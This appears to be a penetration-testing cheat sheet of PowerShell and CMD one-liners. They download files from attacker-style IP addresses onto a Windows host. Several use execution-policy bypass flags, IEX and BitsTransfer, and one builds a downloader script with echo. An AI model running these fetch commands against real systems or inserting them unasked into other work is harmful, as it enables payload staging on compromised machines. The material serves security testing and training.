.................................................USING POWERSHELL -............................................... 
------------------------------------------------------------------------------------------------------------------


#### 

**Web Content Download**
    
    $webClient.DownloadFile('http://10.10.10.10:80/demo.txt','c:\temp\demo.txt')

**Web Content Download**
    
    powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/demo.txt','c:\temp\demo.txt')

**Web Content Download**
    
    powershell.exe IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.10.10:80/demo.txt','C:\temp\demo.txt')

**Web Content Download**
    
    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.10.10/demo.txt','C:\temp\demo.txt')"

**Web Content Download**
    
    powershell.exe Invoke-RestMethod -Uri "http://10.10.10.10/demo.txt" -OutFile "c:\temp\demo.txt"

**Web Content Download**
    
    powershell.exe Invoke-webRequest -Uri "http://10.10.10.10/demo.txt" -OutFile "c:\temp\demo.txt"

**Powershell Wget**
    
    powershell.exe -c wget "http://10.10.14.17/demo.txt" -outfile "c:\temp\demo.txt"

**Powershell Curl**
    
    powershell.exe -c "curl.exe http://10.10.10.10:80/demo.txt c:\temp\demo.txt"

**Powershell IEX**

    echo IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.10.10:80/demo.txt','C:\temp\demo.txt') | powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile
   
**Powershell Direct URI**
    
    iwr -uri http://192.168.45.240/demo.txt -Outfile demo.txt

**Powershell BitsTransfer**

    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://10.10.10.10/demo.txt' -Destination 'c:\temp\demo.txt'"

**Using file**
    
    echo '$storageDir = $pwd' > wget.ps1
    echo '$webclient = New-Object System.Net.WebClient' >> wget.ps1
    echo '$url = "http://10.10.10.10/demo.txt"' >> wget.ps1
    echo '$file = "c:\temp\demo.txt"' >> wget.ps1
    echo '$webclient.DownloadFile($url, $file)' >> wget.ps1

    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
------------------------------------------------------------------------------------------------------------------

USING CMD - 
------------------------------------------------------------------------------------------------------------------

**Web Content Download**
    
    powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/demo.txt','c:\temp\demo.txt')

**Web Content Download**

    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://10.10.10.10/demo.txt' -Destination 'C:\temp\demo.txt'"

**Web Content Download**
    
    powershell.exe -c "$webClient = New-Object System.Net.WebClient; $webClient.DownloadFile('http://10.10.10.10:80/demo.txt','c:\temp\demo.txt')"

**Web Content Download**
    
    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.10.10/demo.txt','C:\temp\demo.txt')"


